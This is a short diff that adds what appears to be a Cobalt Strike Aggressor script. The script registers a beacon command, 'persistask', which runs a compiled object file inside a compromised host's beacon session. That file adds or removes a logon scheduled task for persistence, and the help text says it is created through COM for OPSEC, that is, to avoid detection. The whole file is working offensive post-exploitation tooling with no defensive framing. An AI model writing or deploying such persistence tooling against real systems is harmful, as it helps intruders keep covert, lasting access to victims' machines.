@@ -1,0 +1,20 @@
+beacon_command_register(
+   "persistask",
+   "Set scheduled task to launch at logon for persistence. Uses COM object to create task for OPSEC.",
+   "Args: persistask <add / remove> <task name> <command to run>"
+);
+
+
+
+alias persistask {
+   local('$handle $data $action $command $taskName');
+
+   $handle = openf(script_resource("persistask.x64.o"));
+   $data = readb($handle, -1);
+   closef($handle);
+
+   $args = bof_pack($1, "zzz", $2, $3, $4);
+
+   btask($1, "Running persistask.");
+   beacon_inline_execute($1, $data, "go", $args);
+}
